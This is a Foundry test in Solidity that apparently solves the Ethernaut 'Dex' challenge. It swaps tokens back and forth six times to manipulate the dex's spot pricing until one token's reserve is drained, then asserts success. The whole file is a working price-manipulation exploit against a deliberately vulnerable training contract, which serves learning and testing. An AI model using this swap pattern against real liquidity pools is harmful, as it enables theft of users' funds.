// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Dex} from "src/levels/Dex.sol";
import {DexFactory} from "src/levels/DexFactory.sol";
import {SwappableToken} from "src/levels/Dex.sol";

interface IToken {
    function balanceOf(address owner) external returns (uint);

    function approve(address owner, address spender, uint amount) external;
}

contract DexTest is Test {
    error HackFailed();

    uint public num;
    DexFactory private factory;
    Dex private dex;
    address private attacker;
    address private deployer;
    SwappableToken private tokenOne;
    SwappableToken private tokenTwo;

    function setUp() external {
        attacker = makeAddr("attacker");
        deployer = makeAddr("deployer");

        vm.prank(deployer, deployer);
        factory = new DexFactory();

        vm.startPrank(address(factory), attacker);
        address dexAddress = factory.createInstance(attacker);
        dex = Dex(dexAddress);

        tokenOne = SwappableToken(dex.token1());
        tokenTwo = SwappableToken(dex.token2());

        vm.stopPrank();
    }

    function test_DexHack() external {
        address tokenOneAddress = address(tokenOne);
        address tokenTwoAddress = address(tokenTwo);

        vm.startPrank(attacker, attacker);

        // Allow maximum number of amount for dex
        tokenOne.approve(attacker, address(dex), 500);
        tokenTwo.approve(attacker, address(dex), 500);

        dex.swap(tokenOneAddress, tokenTwoAddress, 10);
        dex.swap(tokenTwoAddress, tokenOneAddress, 20);
        dex.swap(tokenOneAddress, tokenTwoAddress, 24);
        dex.swap(tokenTwoAddress, tokenOneAddress, 30);
        dex.swap(tokenOneAddress, tokenTwoAddress, 41);
        dex.swap(tokenTwoAddress, tokenOneAddress, 45);

        console2.log(
            tokenOne.balanceOf(address(dex)),
            "__",
            tokenTwo.balanceOf(address(dex))
        );

        assertTrue(
            ((tokenOne.balanceOf(address(dex)) == 0) ||
                (tokenTwo.balanceOf(address(dex)) == 0)),
            "Failed To Drain Dex!!!"
        );

        bool success = factory.validateInstance(
            payable(address(dex)),
            attacker
        );
        assertTrue(success, "Failed To Validate The Instance");
        vm.stopPrank();
    }
}
